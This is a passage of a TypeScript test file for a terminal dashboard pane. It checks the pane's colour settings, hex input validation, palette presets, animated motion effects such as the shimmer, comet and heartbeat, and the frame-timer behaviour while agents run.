  expect(setPlace(base, 'title', ' #3EC6E0 ', BACKGROUND).settings.places).toEqual({ title: '#3ec6e0' });
  expect(setPlace({ ...base, places: { title: '#3ec6e0' } }, 'title', 'auto', BACKGROUND).settings.places).toEqual({});
  for (const bad of ['#zzz', 'blue', '#12345', '#1234567', '']) {
    const got = setPlace({ ...base, places: { title: '#3ec6e0' } }, 'title', bad, BACKGROUND);
    if (bad === '') expect(got.settings.places).toEqual({});
    else expect(got, bad).toEqual({ refused: REFUSAL });
  }
  expect(setCustom(base, 0, '#zzz')).toEqual({ refused: REFUSAL });
  expect(setCustom(base, 1, '#00FF00').settings.custom[1]).toBe('#00ff00');
  expect(setCustom(base, 1, '#00FF00').settings.palette).toBe('custom');
  const faint = setPlace({ ...base, places: { fail: '#ff5f6d' } }, 'fail', '#0c0d11', BACKGROUND);
  expect(faint.settings.places).toEqual({});
  expect(faint.refused).toContain('#0b0c10');
  expect(faint.refused).toContain(FIXED.aurora.fail);
  expect(setPlace(base, 'wait', '#0c0d11', BACKGROUND).settings.places).toEqual({});
  // a faint colour of any other place is a choice, not a refusal
  expect(setPlace(base, 'title', '#0c0d11', BACKGROUND)).toEqual({ settings: { ...base, places: { title: '#0c0d11' } } });
  // read from the store, a faint wait or fail colour is auto
  expect(settingsOf({ v: 1, places: { wait: '#0c0d11', fail: '#0c0d11', title: '#0c0d11' } }).places).toEqual({ title: '#0c0d11' });
  // in the pane: after each refusal the held and the stored settings are unchanged
  const h = await settingsPane();
  inputOf(h, 'place:title').onSubmit('#3ec6e0');
  await flush();
  expect((await savedOf(h)).places).toEqual({ title: '#3ec6e0' });
  for (const bad of ['#zzz', 'blue', '#12345', '#1234567']) {
    inputOf(h, 'place:title').onSubmit(bad);
    await flush();
    expect(h.texts(), bad).toContain(REFUSAL);
    expect(inputOf(h, 'place:title').value, bad).toBe('#3ec6e0');
    expect((await savedOf(h)).places, bad).toEqual({ title: '#3ec6e0' });
  }
  inputOf(h, 'place:title').onSubmit('auto');
  await flush();
  expect(inputOf(h, 'place:title').value).toBe('auto');
  expect((await savedOf(h)).places).toEqual({});
  inputOf(h, 'place:fail').onSubmit('#ff5f6d');
  await flush();
  expect((await savedOf(h)).places).toEqual({ fail: '#ff5f6d' });
  inputOf(h, 'place:fail').onSubmit('#0c0d11');
  await flush();
  expect(h.texts().some((x) => x.includes('#0b0c10') && x.includes('preset'))).toBe(true);
  expect(inputOf(h, 'place:fail').value).toBe('auto');
  const stored = await savedOf(h);
  expect(Object.hasOwn(stored.places, 'fail')).toBe(false);
  expect(JSON.stringify(stored)).not.toContain('#0c0d11');
  expect(JSON.stringify(stored)).not.toContain('#ff5f6d');
  inputOf(h, 'custom:0').onSubmit('#zzz');
  await flush();
  expect(h.texts()).toContain(REFUSAL);
  expect((await savedOf(h)).custom[0]).toBe('#e07a4f');
});

// Phase 08.8.1 L-02 L-01: the view holds every choice the sketch's Lab holds, and Default resets them all.
it('risk:regression the settings view holds the presets the style the places the motion level and the twelve switches and Default resets them (L-02 L-01)', async () => {
  const { settingsView, settingsOf } = await loadView();
  const sw = settingsView(settingsOf({ v: 1, palette: 'ember' }));
  expect(sw.palettes.map((p: any) => p.name)).toEqual(['aurora', 'ember', 'ocean', 'forest', 'sunset', 'mono', 'contrast', 'custom']);
  expect(sw.palettes.find((p: any) => p.name === 'ember').swatch).toHaveLength(5);
  expect(sw.palettes.find((p: any) => p.name === 'ember').swatch[0]).toEqual({ ch: '█', color: '#ff7a45' });
  expect(sw.palettes.find((p: any) => p.name === 'ember').selected).toBe(true);
  expect(sw.places.map((p: any) => p.label)).toEqual(['title', 'stage track', 'live line', 'agents', 'progress bar', 'criteria', 'log', 'done tick', 'waiting for you', 'failure']);
  expect(sw.places.every((p: any) => p.value === 'auto' && /^#[0-9a-f]{6}$/.test(p.color))).toBe(true);
  const h = await settingsPane();
  for (const i of [0, 1, 2]) expect(inputOf(h, `custom:${i}`)).toBeDefined();
  expect(['style:gradient', 'style:solid'].map((k) => buttonOf(h, k)?.label)).toEqual(['gradient', 'one colour']);
  const keys = ['title', 'stage', 'now', 'agents', 'bar', 'criteria', 'log', 'tick', 'wait', 'fail'];
  expect(keys.map((k) => inputOf(h, `place:${k}`)?.label)).toEqual(['title', 'stage track', 'live line', 'agents', 'progress bar', 'criteria', 'log', 'done tick', 'waiting for you', 'failure']);
  expect([0, 1, 2].map((i) => inputOf(h, `custom:${i}`).label)).toEqual(['from', 'via', 'to']);
  expect(['lively', 'mission', 'calm', 'off'].map((k) => buttonOf(h, `motion:${k}`)?.label)).toEqual(['lively', 'mission', 'calm', 'off']);
  const on = (): string[] => h.texts().filter((x) => x.startsWith('[x] '));
  const all = (): string[] => h.texts().filter((x) => x.startsWith('[x] ') || x.startsWith('[ ] '));
  expect(all()).toHaveLength(12);
  expect(on()).toHaveLength(8);
  expect(h.texts()).not.toContain('mine');
  press(h, 'motion:calm');
  await flush();
  expect(on()).toEqual(['[x] shimmer on the live line', '[x] rolling counter']);
  expect(buttonOf(h, 'motion:calm').variant).toBe('primary');
  press(h, 'effect:comet');
  await flush();
  expect(on()).toHaveLength(3);
  expect(h.texts()).toContain('mine');
  expect(buttonOf(h, 'motion:calm').variant).toBe('secondary');
  press(h, 'style:solid');
  await flush();
  expect(buttonOf(h, 'style:solid').variant).toBe('primary');
  const saved = await savedOf(h);
  expect(saved).toMatchObject({ v: 1, style: 'solid', motion: 'mine', palette: 'aurora' });
  expect(saved.effects).toEqual({ shimmer: true, roll: true, comet: true });
  press(h, 'default');
  await flush();
  expect(on()).toHaveLength(8);
  const reset = await savedOf(h);
  expect(reset).toEqual(settingsOf(undefined));
  press(h, 'settings:back');
  await flush();
  expect(inputOf(h, 'place:title')).toBeUndefined();
  expect(h.texts()).toContain('ST-1 Login form');
});

// Phase 08.8.1 L-03 (Ruling: the focus rule): the settings key is a Button hotkey, never a key handler of the pane's own, so an s typed into a focused field is text.
it('risk:regression the settings key never takes an s typed into the search field or a settings field (L-03)', async () => {
  const h = await claimedPane();
  press(h, 'tab:dashboard');
  await vi.waitFor(() => expect(h.input()).toBeDefined());
  expect(h.input()?.autoFocus).toBeUndefined();
  expect(buttonOf(h, 'settings')).toMatchObject({ hotkey: 's' });
  expect(buttonOf(h, 'settings').autoFocus).toBeUndefined();
  h.input()?.onInput('as');
  await flush();
  expect(h.input()?.value).toBe('as');
  expect(tabs(h)['tab:dashboard'].variant).toBe('primary');
  expect(h.buttons().some((b) => String(b.key).startsWith('palette:'))).toBe(false);
  for (const b of h.buttons()) if (b.key !== 'settings') expect(b.hotkey, String(b.key)).not.toBe('s');
  press(h, 'settings');
  await vi.waitFor(() => expect(inputOf(h, 'place:title')).toBeDefined());
  inputOf(h, 'place:title').onInput('s');
  await flush();
  expect(inputOf(h, 'place:title').value).toBe('s');
  expect(h.buttons().some((b) => String(b.key).startsWith('palette:'))).toBe(true);
  expect(h.$.store.set).not.toHaveBeenCalled();
  expect((await savedOf(h)).places).toEqual({});
  expect(marked(h)).toEqual([]);
  for (const b of h.buttons()) if (b.key !== 'settings') expect(b.hotkey, String(b.key)).not.toBe('s');
});

// ---- Phase 08.8.1-07 task 3: every place of the ticket tab takes the person's colours ----

// Phase 08.8.1 L-01 L-02: the ticket tab has no colour per stage; each place takes the person's colours, one gradient system or one colour per place. The dashboard tab keeps its stage colours.
it("risk:regression the ticket tab takes the person's colours with no colour per stage (L-01 L-02)", async () => {
  const { gradientAt, PALETTES, ticketView, pipelineOf, settingsOf } = await loadView();
  const aurora = PALETTES.aurora as string[];
  const STAGE = ['blue', 'cyan', 'yellow', 'magenta', 'green'];
  const now = Math.floor(Date.now() / 1000);
  const over = {
    stage: 'build',
    tasksDone: 1,
    tasksTotal: 3,
    now: { task: 2, title: 'Beta' },
    tasks: [taskOf(1, 'Alpha', true), taskOf(2, 'Beta'), taskOf(3, 'Gamma')],
    criteria: [critOf('ac-1', 'Logs in', 'passing'), critOf('ac-2', 'Logs out', 'failing')],
    log: [{ at: now - 5, kind: 'gate', text: 'gate done FAIL: red', fail: true }, { at: now - 9, kind: 'commit', text: 'build: x' }],
  };
  // Phase 08.8.1-08: this case reads the colour of each place, so its person has motion off (a moving effect repaints the places frame by frame)
  const still = { v: 1, motion: 'off', effects: {} };
  const h = await paneWith(over, (x) => {
    x.rows = 40;
    void x.store.set('settings', still);
  });
  h.agents = [agentOf('a1', 'accord-executor')];
  await h.fire('turn.start', subStart('a1'));
  await vi.waitFor(() => expect(isRunning(h, 'executor')).toBe(true));
  const at = (place: number, p = 0): string => gradientAt(aurora, place + p);
  // the stage track: gradient cells at its position, none of the stage names
  ['intent/approach', 'plan', 'build 1/3'].forEach((label, i) => expect(h.cell(label).box.backgroundColor, label).toBe(at(0.15, i / 5)));
  for (const label of ['review', 'verify']) expect(h.cell(label).box.backgroundColor, label).toBeUndefined();
  for (const n of h.nodes('Box')) expect(STAGE).not.toContain(n.props.backgroundColor);
  // the tab-1 label's stage word is the live line's colour, its agent count the agents', its failure mark the failure colour
  expect(h.cell(' build').text.color).toBe(at(0.3));
  expect(h.cell(' ◐1').text.color).toBe(at(0.62));
  expect(h.cell(' gate failed').text.color).toBe('#ff6b6b');
  // the places of the tab
  expect(h.cell('task 2 of 3 · Beta').text.color).toBe(at(0.3));
  expect(h.cell('✓').text.color).toBe('#6fd39a');
  expect(h.cell('▸').text.color).toBe(at(0.3));
  expect(h.nodes('Progress')[0].props.color).toBe(at(0.45));
  expect(h.cell(spun('executor')).text.color).toBe(at(0.62));
  expect(h.cell('ac-1').text.color).toBe(at(0.8, 0));
  expect(h.cell('ac-2').text.color).toBe(at(0.8, 0.5));
  // the failure box and the log both hold the gate line; the log's is the last
  expect(h.nodes('Text').filter((n) => flat(n.props.children) === 'gate done FAIL: red').at(-1)?.props.color).toBe('#ff6b6b');
  const box = h.nodes('Box').find((b) => b.props.borderColor === '#ff6b6b');
  expect(textsIn(box)[0]).toBe('Gate failed');
  expect(h.cell('Gate failed').text.color).toBe('#ff6b6b');
  // the newest log line takes the log's colour when it did not fail
  // Phase 08.8.1-09: the waiting line glows toward white while it blinks, so this check of the waiting colour keeps motion off
  const calm = await paneWith({ log: [{ at: now - 5, kind: 'commit', text: 'newest one' }, { at: now - 9, kind: 'commit', text: 'older one' }] }, (x) => void x.store.set('settings', still));
  expect(calm.cell('newest one').text.color).toBe(at(0.55));
  expect(calm.cell('older one').text.color).toBeUndefined();
  // a main-loop turn that ended draws the waiting line in the waiting colour
  await calm.fire('turn.complete', { reason: 'answer', answer: 'done' });
  await vi.waitFor(() => expect(calm.texts().some((x) => x.startsWith('Waiting for you'))).toBe(true));
  expect(calm.cell(calm.texts().find((x) => x.startsWith('Waiting for you')) as string).text.color).toBe('#e07a4f');
  // one colour per place: the person's own colours win, the other places take the palette's colour at the place's position
  const own = { ...still, style: 'solid', places: { title: '#3ec6e0', agents: '#ff5f6d' } };
  const solid = await paneWith({ stage: 'build', now: { task: 2, title: 'Beta' } }, (x) => void x.store.set('settings', own));
  solid.agents = [agentOf('a1', 'accord-executor')];
  await solid.fire('turn.start', subStart('a1'));
  await vi.waitFor(() => expect(isRunning(solid, 'executor')).toBe(true));
  expect(new Set(titleColors(solid))).toEqual(new Set(['#3ec6e0']));
  expect(solid.cell(spun('executor')).text.color).toBe('#ff5f6d');
  expect(solid.cell('task 2 of 3 · Beta').text.color).toBe(at(0.3));
  expect(solid.cell(' build').text.color).toBe(at(0.3));
  // the pure view gives hex colours for the stage track and keeps the dashboard's stage names in pipelineOf
  const t = ticketView({ ticket: { id: 'ST-1', state: { ticket: detailOf(over) } }, now, settings: settingsOf(undefined) });
  expect(t.cells.map((c: any) => c.color)).toEqual([0, 1, 2, 3, 4].map((i) => at(0.15, i / 5)));
  expect(pipelineOf({ lane: 'M', stage: 'build' }).map((c: any) => c.color)).toEqual(STAGE);
});

// ---- Phase 08.8.1-08: the motion engine (D-03) and the lively preset (L-01, L-07) ----

const MOVING = { stage: 'build', tasksDone: 1, tasksTotal: 3, now: { task: 2, title: 'Beta' }, tasks: [taskOf(1, 'Alpha', true, ['ac-1']), taskOf(2, 'Beta', false, ['ac-2']), taskOf(3, 'Gamma')], criteria: [critOf('ac-1', 'Logs in', 'passing'), critOf('ac-2', 'Logs out', 'failing')] };
// the live timers of the host: the ones `$.clock.every` was asked for and nobody cancelled
const liveTimers = (h: Awaited<ReturnType<typeof host>>): number[] => everyTimers(h).filter((t) => !t.cancelled).map((t) => t.ms);
// the colour of each character of the first Text whose joined text is `text`, or undefined when that Text holds a plain string
const runColors = (h: Awaited<ReturnType<typeof host>>, text: string): string[] | undefined => {
  const kidsOf = h.cell(text)?.text.children as unknown[];
  return kidsOf.every((c: any) => c && typeof c === 'object') ? kidsOf.map((c: any) => c.props.color) : undefined;
};
const startExecutor = async (h: Awaited<ReturnType<typeof host>>): Promise<void> => {
  h.agents = [agentOf('a1', 'accord-executor')];
  await h.fire('turn.start', subStart('a1'));
};

// Phase 08.8.1 D-03: one frame timer redraws at the probe's rate only while the ticket tab shows, motion is not off and an accord agent runs; none when idle or on another view; off keeps only the 1-second agent clock; off the terminal the rate is at most 10 a second and a still Desktop (P7) has no frame timer
it('risk:resource one frame timer runs at the probe rate only while something runs and none when idle (D-03)', async () => {
  const period = await framePeriod();
  const h = await paneWith(MOVING);
  expect(liveTimers(h)).toEqual([]);
  expect(runColors(h, 'task 2 of 3 · Beta')).toBeUndefined();
  await startExecutor(h);
  expect(liveTimers(h)).toEqual([period]);
  // the live line is one coloured text per character while the timer runs
  expect(runColors(h, 'task 2 of 3 · Beta')?.every((c) => /^#[0-9a-f]{6}$/.test(c))).toBe(true);
  // another view stops the timer and coming back starts one again: the dashboard tab, the widget placement, the settings view
  press(h, 'tab:dashboard');
  await vi.waitFor(() => expect(liveTimers(h)).toEqual([]));
  press(h, 'tab:ticket');
  await vi.waitFor(() => expect(liveTimers(h)).toEqual([period]));
  h.columns = 100;
  h.placement = 'widget';
  await h.$.ui.invalidate('ui.render');
  expect(liveTimers(h)).toEqual([]);
  h.placement = 'dock';
  await h.$.ui.invalidate('ui.render');
  expect(liveTimers(h)).toEqual([period]);
  press(h, 'settings');
  await vi.waitFor(() => expect(liveTimers(h)).toEqual([]));
  press(h, 'settings');
  await vi.waitFor(() => expect(liveTimers(h)).toEqual([period]));
  // the agent ends: no timer is left and the live line is plain again
  await h.fire('turn.complete', { agentId: 'a1', durationMs: 10, reason: 'answer' });
  expect(liveTimers(h)).toEqual([]);
  expect(runColors(h, 'task 2 of 3 · Beta')).toBeUndefined();
  // motion off keeps only the 1-second clock of the agents' times
  const off = await paneWith(MOVING, (x) => void x.store.set('settings', { v: 1, motion: 'off', effects: {} }));
  await startExecutor(off);
  expect(liveTimers(off)).toEqual([1000]);
  expect(runColors(off, 'task 2 of 3 · Beta')).toBeUndefined();
  // off the terminal the pane redraws at most 10 a second
  const desk = await paneWith(MOVING, (x) => void (x.surface = 'desktop'));
  await startExecutor(desk);
  expect(liveTimers(desk)).toHaveLength(1);
  expect(liveTimers(desk)[0]).toBeGreaterThanOrEqual(100);
  // P7 static: the Desktop draws the person's colours and no effect, and no frame timer runs there
  viewPatch = (text) => text.replace('export const DESKTOP_MOTION = true', 'export const DESKTOP_MOTION = false');
  const still = await paneWith(MOVING, (x) => void (x.surface = 'desktop'));
  viewPatch = undefined;
  await startExecutor(still);
  expect(liveTimers(still)).toEqual([1000]);
  const before = titleColors(still);
  await flush();
  await still.$.ui.invalidate('ui.render');
  expect(titleColors(still)).toEqual(before);
  expect(runColors(still, 'task 2 of 3 · Beta')).toBeUndefined();
});

// Phase 08.8.1 L-01: the shimmer is a pure function of the frame time: one `#rrggbb` per code point, a glow that moves between frames, the same colours for the same time
it('risk:parsing the shimmer moves a glow across the live line frame by frame (L-01)', async () => {
  const { shimmer, PALETTES } = await loadView();
  const stops = [PALETTES.aurora[0], PALETTES.aurora[3]];
  const a = shimmer('Reviewing', 0, stops);
  const b = shimmer('Reviewing', 500, stops);
  expect(a.map((r: any) => r.ch)).toEqual([...'Reviewing']);
  for (const r of [...a, ...b]) expect(r.color).toMatch(/^#[0-9a-f]{6}$/);
  expect(b.some((r: any, i: number) => r.color !== a[i].color)).toBe(true);
  expect(shimmer('Reviewing', 500, stops)).toEqual(b);
  expect(shimmer('', 500, stops)).toEqual([]);
});

// Phase 08.8.1 L-01 L-07: each lively effect and the spinner is a pure function of the frame time; every colour is `#rrggbb`
it('risk:parsing each lively effect is a pure function of the frame time (L-01 L-07)', async () => {
  const { flowRun, comet, equalizer, typed, sparkles, rolling, breathe, spinner, PALETTES, isHex } = await loadView();
  const stops = PALETTES.aurora;
  const hex = (colors: string[]): void => colors.forEach((c) => expect(isHex(c), c).toBe(c));
  const sum = (c: string): number => [1, 3, 5].reduce((a, i) => a + parseInt(c.slice(i, i + 2), 16), 0);
  // the flowing title shifts the gradient with the time and gives the same colours for the same time
  const f0 = flowRun('Login form', stops, 0);
  const f1 = flowRun('Login form', stops, 2000);
  expect(f0.map((r: any) => r.ch)).toEqual([...'Login form']);
  hex([...f0, ...f1].map((r: any) => r.color));
  expect(f1.some((r: any, i: number) => r.color !== f0[i].color)).toBe(true);
  expect(flowRun('Login form', stops, 2000)).toEqual(f1);
  // the comet: 20 cells, the first 10 filled with a bright head that moves, the rest an empty track
  const c0 = comet(0.5, 20, 0, stops);
  const c1 = comet(0.5, 20, 250, stops);
  expect(c0).toHaveLength(20);
  expect(c0.slice(0, 10).every((c: any) => c.ch === '━')).toBe(true);
  expect(c0.slice(10).every((c: any) => c.ch === '─')).toBe(true);
  hex([...c0, ...c1].map((c: any) => c.color));
  const brightest = (cells: any[]): number => cells.slice(0, 10).reduce((best: number, c: any, i: number) => (sum(c.color) > sum(cells[best].color) ? i : best), 0);
  expect([brightest(c0), brightest(c1)]).toEqual([0, 4]);
  expect(comet(0.5, 20, 250, stops)).toEqual(c1);
  // the equalizer: glyphs from the seven bars that change with the time
  const e0 = equalizer(0, 6, 1);
  expect([...e0]).toHaveLength(6);
  expect([...e0, ...equalizer(400, 6, 1)].every((g) => '▁▂▃▄▅▆▇'.includes(g))).toBe(true);
  expect(equalizer(400, 6, 1)).not.toBe(e0);
  expect(equalizer(0, 6, 1)).toBe(e0);
  // typed text: a character every 28 ms and a cursor until it is whole
  expect(typed('reading the brief', 0, 280)).toBe('reading th▌');
  expect(typed('reading the brief', 0, 28 * 17)).toBe('reading the brief');
  expect(typed('reading the brief', 500, 100)).toBe('▌');
  // sparkles: particles inside the width, none after 1.2 seconds, the same for the same seed
  const burst = { at: 0, seed: 7 };
  const s = sparkles(burst, 600, 40);
  expect(s.length).toBeGreaterThan(0);
  for (const p of s) {
    expect('✦✧⋆·*+˚').toContain(p.ch);
    expect(p.x).toBeGreaterThanOrEqual(0);
    expect(p.x).toBeLessThan(40);
    expect(p.y).toBeGreaterThanOrEqual(0);
    expect(p.y).toBeLessThan(3);
  }
  expect(sparkles(burst, 600, 40)).toEqual(s);
  expect(sparkles({ at: 0, seed: 8 }, 600, 40)).not.toEqual(s);
  expect(sparkles(burst, 1200, 40)).toEqual([]);
  expect(sparkles(burst, -5, 40)).toEqual([]);
  // the rolling counter: changing digits for 700 ms, then the number
  const digits = new Set([0, 50, 100, 150, 200, 250, 300, 350].map((now) => rolling(3, 4, 0, now)));
  expect(digits.size).toBeGreaterThan(1);
  for (const d of digits) expect(d).toMatch(/^[0-9] of 4$/);
  expect(rolling(3, 4, 0, 800)).toBe('3 of 4');
  expect(rolling(3, 4, undefined, 10)).toBe('3 of 4');
  // breathing: stays a colour and comes back to its start after one period
  const base = '#6cc7d9';
  const b = [0, 200, 550, 900].map((t) => breathe(base, t));
  hex(b);
  expect(new Set(b).size).toBeGreaterThan(1);
  expect(breathe(base, 1100)).toBe(breathe(base, 0));
  // the spinner's four marks
  expect([0, 125, 250, 375, 500].map(spinner)).toEqual(['◐', '◓', '◑', '◒', '◐']);
  // no effect reads a clock of its own: the same arguments give the same frame (checked above) and the source holds no call to one
  expect(readFileSync(new URL('../panel/view.js', import.meta.url), 'utf8').split('\n').filter((l) => !/^\s*\/\//.test(l)).join('\n')).not.toMatch(/Date\.now|performance\./);
});

// ---- Phase 08.8.1-08 task 3: the lively and calm presets on the ticket tab, the burst of a finished task and the cut effects ----

// The tasks of a four-task plan with `done` of them done, the task in flight the next one; each task covers one criterion
const planOf = (done: number): Record<string, unknown> => ({
  stage: 'build',
  tasksDone: done,
  tasksTotal: 4,
  now: { task: done + 1, title: `Task ${done + 1}` },
  tasks: [1, 2, 3, 4].map((n) => taskOf(n, `Task ${n}`, n <= done, [`ac-${n}`])),
  criteria: [1, 2, 3, 4].map((n) => critOf(`ac-${n}`, `Criterion ${n}`, 'untested')),
});
// the pane after one more `show` result: an accord agent ends, its debounced refresh runs and `show` answers with these keys
async function reshow(h: Awaited<ReturnType<typeof host>>, over: Record<string, unknown>, id: string): Promise<void> {
  h.agents = [...h.agents, agentOf(id, 'accord-planner')];
  await h.fire('turn.start', subStart(id));
  await h.fire('turn.complete', { agentId: id, durationMs: 10, reason: 'answer' });
  await h.timers.filter((t) => t.kind === 'after' && !t.cancelled).at(-1)?.fn();
  await vi.waitFor(() => expect(h.inflight()).toBe(1));
  h.settle({ stdout: JSON.stringify(detailOf(over)) });
  await vi.waitFor(() => expect(h.inflight()).toBe(0));
}
const sparkBox = (h: Awaited<ReturnType<typeof host>>): El | undefined => h.nodes('Box').find((b) => b.props.position === 'absolute');
const counterOf = (h: Awaited<ReturnType<typeof host>>): string | undefined => h.texts().find((x) => /^\d of 4$/.test(x));
const barText = (h: Awaited<ReturnType<typeof host>>): El | undefined => h.nodes('Text').find((n) => /^[━─╸]{8,}$/.test(flat(n.props.children)));
const eqText = (h: Awaited<ReturnType<typeof host>>): string | undefined => h.texts().find((x) => /^[▁▂▃▄▅▆▇]{4,}$/.test(x));
const childColors = (n: El | undefined): string[] => ((n?.props.children ?? []) as any[]).map((c) => c.props.color);

// Phase 08.8.1 L-01 D-03: a finished task starts one burst (sparkles and a rolling counter, about 1.2 seconds) and the lively preset draws its effects while an agent runs; calm moves only the shimmer and the counter, and under mine only the switched effects move
it('risk:complex-branching a task finished plays sparkles and the rolling counter once and the lively preset draws its effects (L-01 D-03)', async () => {
  const h = await paneWith(planOf(2), (x) => void (x.rows = 40));
  // a fixed clock: the comet head runs on the clock, and from some real times both frames sit past the filled part and look alike (a flake)
  const T = 1_800_000_000_000;
  const clock = vi.spyOn(Date, 'now').mockReturnValue(T);
  try {
    await startExecutor(h);
    await h.fire('tool.call', { agentId: 'a1', tool: 'Edit', file_path: 'src/view.js' });
    // no burst yet: the same count again starts none, and the frame holds no sparkle
    await reshow(h, planOf(2), 'p1');
    expect(sparkBox(h)).toBeUndefined();
    await reshow(h, planOf(3), 'p2');
    // inside the burst: sparkle glyphs in the overlay, the counter digit rolling
    const frame = async (ms: number): Promise<void> => {
      clock.mockReturnValue(T + ms);
      await h.$.ui.invalidate('ui.render');
    };
    await frame(100);
    const glyphs = '✦✧⋆·*+˚';
    expect([...textsIn(sparkBox(h)).join('')].some((ch) => glyphs.includes(ch))).toBe(true);
    const first = counterOf(h);
    const titleA = titleColors(h);
    const barA = childColors(barText(h));
    const eqA = eqText(h);
    const typedA = h.texts().find((x) => x.startsWith('Ed'));
    const critA = h.cell('ac-4').text.color;
    const stillA = h.cell('ac-1').text.color;
    await frame(350);
    expect(first).toMatch(/^\d of 4$/);
    expect(first).not.toBe('3 of 4');
    expect(counterOf(h)).not.toBe(first);
    // the flowing title, the comet, the equalizer, the typed line and the breathing criterion each changed with the frame time
    expect(titleColors(h)).not.toEqual(titleA);
    expect(childColors(barText(h))).not.toEqual(barA);
    expect(eqText(h)).not.toBe(eqA);
    expect(typedA).toBeDefined();
    expect(h.texts().find((x) => x.startsWith('Ed'))).not.toBe(typedA);
    expect(h.cell('ac-4').text.color).not.toBe(critA);
    // a criterion the task in flight does not cover keeps its colour
    expect(h.cell('ac-1').text.color).toBe(stillA);
    // after the burst: the number, no sparkle
    await frame(1300);
    expect(counterOf(h)).toBe('3 of 4');
    expect(sparkBox(h)).toBeUndefined();
    // a new ticket id starts none, even with a higher count
    const next = JSON.stringify(board({ current: 'ST-2', yours: { rows: [{ id: 'ST-2', title: 'Export' }], more: 0 } }));
    await h.fire('turn.start', { turnId: 'm', text: 'x' });
    await h.fire('turn.complete', { reason: 'answer' });
    await vi.waitFor(() => expect(h.inflight()).toBe(1));
    h.settle({ stdout: next });
    await vi.waitFor(() => expect(h.$.process.run).toHaveBeenLastCalledWith(SHOW('ST-2'), { timeoutMs: 120000 }));
    clock.mockReturnValue(T + 5000);
    h.settle({ stdout: JSON.stringify(detailOf({ ...planOf(4), id: 'ST-2', title: 'Export' })) });
    await vi.waitFor(() => expect(h.texts()).toContain('ST-2 Export'));
    expect(sparkBox(h)).toBeUndefined();
  } finally {
    clock.mockRestore();
  }
  // calm: the shimmer and the counter move, nothing else
  const calm = await paneWith(planOf(2), (x) => void x.store.set('settings', { v: 1, motion: 'calm', effects: { shimmer: true, roll: true } }));
  // a fixed clock again: the glow and the comet head run on it
  const c0 = 1_800_000_001_000;
  const spy = vi.spyOn(Date, 'now').mockReturnValue(c0);
  try {
    await startExecutor(calm);
    const grab = async (ms: number): Promise<{ title: string[]; now: string[] | undefined; bar: boolean; eq: string | undefined }> => {
      spy.mockReturnValue(c0 + ms);
      await calm.$.ui.invalidate('ui.render');
      return { title: titleColors(calm), now: runColors(calm, 'task 3 of 4 · Task 3'), bar: barText(calm) !== undefined, eq: eqText(calm) };
    };
    const a = await grab(100);
    const b = await grab(350);
    expect(b.title).toEqual(a.title);
    expect(a.now).toBeDefined();
    expect(b.now).not.toEqual(a.now);
    expect(a.bar).toBe(false);
    expect(calm.nodes('Progress')).toHaveLength(1);
    expect(a.eq).toBeUndefined();
  } finally {
    spy.mockRestore();
  }
  // mine with only the comet on: only the comet moves
  const mine = await paneWith(planOf(2), (x) => void x.store.set('settings', { v: 1, motion: 'mine', effects: { comet: true } }));
  const m0 = 1_800_000_001_000;
  const spy2 = vi.spyOn(Date, 'now').mockReturnValue(m0);
  try {
    await startExecutor(mine);
    spy2.mockReturnValue(m0 + 100);
    await mine.$.ui.invalidate('ui.render');
    const t1 = titleColors(mine);
    const bar1 = childColors(barText(mine));
    spy2.mockReturnValue(m0 + 350);
    await mine.$.ui.invalidate('ui.render');
    expect(titleColors(mine)).toEqual(t1);
    expect(childColors(barText(mine))).not.toEqual(bar1);
    expect(runColors(mine, 'task 3 of 4 · Task 3')).toBeUndefined();
    expect(eqText(mine)).toBeUndefined();
  } finally {
    spy2.mockRestore();
  }
});

// Phase 08.8.1 D-03: an effect the probe cut is never drawn, whatever the person switched on
it('risk:regression the effects the probe cut are never drawn (D-03)', async () => {
  viewPatch = (text) => text.replace('export const CUT_EFFECTS = [];', "export const CUT_EFFECTS = ['comet'];");
  const { effectsOf, CUT_EFFECTS } = await loadView();
  expect(CUT_EFFECTS).toEqual(['comet']);
  expect([...effectsOf({ motion: 'lively', effects: {} })]).not.toContain('comet');
  expect([...effectsOf({ motion: 'mine', effects: { comet: true, eq: true } })]).toEqual(['eq']);
  const mine = await paneWith(planOf(2), (x) => void x.store.set('settings', { v: 1, motion: 'mine', effects: { comet: true } }));
  viewPatch = undefined;
  await startExecutor(mine);
  expect(barText(mine)).toBeUndefined();
  expect(mine.nodes('Progress')).toHaveLength(1);
  // the same pane without the cut draws the comet
  const open = await paneWith(planOf(2), (x) => void x.store.set('settings', { v: 1, motion: 'mine', effects: { comet: true } }));
  await startExecutor(open);
  expect(barText(open)).toBeDefined();
});

// ---- Phase 08.8.1-09 task 1: the mission preset draws a heartbeat and a train (L-01) ----

// Phase 08.8.1 L-01: the heartbeat and the train are pure functions of the frame time; the heartbeat is `width` cells with a beat that moves and a taller glyph where a log event happened inside its span; the train rides only the current stage cell
it('risk:parsing the heartbeat and the train are pure functions of the frame time (L-01)', async () => {
  const { heartbeat, train, PALETTES, isHex } = await loadView();
  const stops = PALETTES.aurora;
  const t = 1_800_000_000_000;
  const event = { at: t / 1000 - 2 };
  const a = heartbeat(60, t, [event], t, stops);
  const b = heartbeat(60, t + 500, [event], t + 500, stops);
  expect(a).toHaveLength(60);
  for (const c of [...a, ...b]) {
    expect('─╱╲‾▇').toContain(c.ch);
    expect(isHex(c.color), c.color).toBe(c.color);
  }
  const beats = (cells: any[]): number[] => cells.flatMap((c, i) => ('╱╲‾'.includes(c.ch) ? [i] : []));
  expect(beats(a).length).toBeGreaterThan(0);
  expect(beats(b)).not.toEqual(beats(a));
  // an event inside the span is one taller glyph that moves left as it ages, one older than the span draws none, and the same arguments give the same frame
  expect(a.filter((c: any) => c.ch === '▇')).toHaveLength(1);
  expect(b.findIndex((c: any) => c.ch === '▇')).toBeLessThan(a.findIndex((c: any) => c.ch === '▇'));
  expect(heartbeat(60, t, [{ at: t / 1000 - 30 }], t, stops).some((c: any) => c.ch === '▇')).toBe(false);
  expect(heartbeat(60, t, [event], t, stops)).toEqual(a);
  expect(heartbeat(0, t, [], t)).toEqual([]);
  // the train: only the current cell holds it, one cell a step, the same for the same time
  const cells = [
    { text: 'intent/approach', state: 'done', color: '#e07a4f' },
    { text: 'build 1/3', state: 'current', color: '#f0907a' },
    { text: 'review', state: 'todo', color: '#d98ad0' },
  ];
  const t0 = train(cells, 0);
  const t1 = train(cells, 500);
  expect(t0.map((r: any[]) => r.length)).toEqual([15, 9, 6]);
  for (const i of [0, 2]) expect(t0[i].every((c: any) => c.ch === ' ')).toBe(true);
  expect(t0[1].every((c: any) => '━▶┄'.includes(c.ch))).toBe(true);
